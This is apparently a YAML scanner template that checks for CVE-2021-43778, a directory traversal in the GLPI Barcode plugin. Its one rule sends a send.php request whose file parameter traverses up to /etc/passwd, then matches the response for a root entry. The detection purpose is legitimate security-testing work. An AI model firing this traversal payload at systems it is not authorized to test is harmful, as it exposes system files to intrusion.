name: yaml-poc-glpi-project-barcode-directory_traversal-CVE-2021-43778
binding: f05a0c02-f82c-442b-b2c2-3402351cee88
detail:
    author: system_user
    links:
        - https://github.com/hansmach1ne/MyExploits/tree/main/Path%20Traversal%20in%20GLPI%20Barcode%20plugin
        - https://github.com/pluginsGLPI/barcode/commit/428c3d9adfb446e8492b1c2b7affb3d34072ff46
        - https://github.com/pluginsGLPI/barcode/releases/tag/2.6.1
        - https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9
        - https://nvd.nist.gov/vuln/detail/CVE-2021-43778
    vulnerability:
        id: db0071ed-3517-4088-a909-59a522da9353
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
        expression: |
            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
